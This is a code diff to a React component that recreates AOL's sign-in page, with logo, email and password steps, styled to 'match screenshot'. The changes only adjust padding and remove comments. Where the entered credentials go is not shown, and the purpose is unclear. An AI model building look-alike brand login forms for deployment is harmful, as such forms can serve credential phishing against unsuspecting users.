@@ -64,14 +64,12 @@ const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginErro
       </header>
 
       <main className="flex-grow w-full flex justify-center items-center px-4">
-        {/* Adjusted width, padding, and border to match screenshot */}
+        {/* Changed py-10 to py-20 to double the vertical padding */}
         <div 
-          className="w-full max-w-[340px] mx-auto py-10 px-8 bg-white rounded-xl border border-gray-200"
+          className="w-full max-w-[340px] mx-auto py-20 px-8 bg-white rounded-xl border border-gray-200"
         >
-          {/* Adjusted logo size and margin */}
           <AolLogo className="h-10 mx-auto mb-6" />
           
-          {/* Adjusted text size and margin */}
           <h2 className="text-center text-2xl font-bold text-gray-900 mb-8">
             Sign in
           </h2>
@@ -82,7 +80,6 @@ const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginErro
             {!showPasswordStep ? (
               <div>
                 <AolInput value={email} onChange={(e: any) => setEmail(e.target.value)} placeholder="Username, email, or mobile" type="email" autoFocus />
-                {/* Adjusted top margin */}
                 <button onClick={handleNext} disabled={!email} className="w-full mt-6 py-2.5 bg-[#0073e6] text-white font-semibold rounded-md hover:bg-[#0066cc] disabled:bg-blue-300 disabled:cursor-not-allowed transition-colors text-sm">
                   Next
                 </button>
@@ -91,14 +88,12 @@ const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginErro
               <div>
                 <div className="text-center text-sm font-medium p-2 rounded-md bg-gray-100 truncate">{email}</div>
                 <AolInput value={password} onChange={(e: any) => setPassword(e.target.value)} placeholder="Password" type="password" autoFocus />
-                {/* Adjusted top margin */}
                 <button type="submit" disabled={isLoading || !password} className="w-full mt-6 py-2.5 bg-[#0073e6] text-white font-semibold rounded-md hover:bg-[#0066cc] disabled:opacity-50 transition-colors text-sm">
                   {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                 </button>
               </div>
             )}
 
-            {/* Adjusted top margin */}
             <div className="text-xs flex justify-between items-center pt-4">
               <label className="flex items-center space-x-2 text-gray-600 cursor-pointer">
                 <input type="checkbox" className="form-checkbox h-3.5 w-3.5 text-blue-600 border-gray-400 rounded-sm focus:ring-blue-500" />
@@ -107,7 +102,6 @@ const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginErro
               <a href="https://login.aol.com/forgot" target="_blank" rel="noopener noreferrer" className="text-xs text-[#0073e6] hover:underline font-semibold">Forgot username?</a>
             </div>
             
-            {/* Adjusted top margin */}
             <div className="pt-6">
               <a href="https://login.aol.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-2.5 border border-[#0073e6] text-[#0073e6] font-semibold rounded-md hover:bg-blue-50 transition-colors text-sm">
                 Create an account
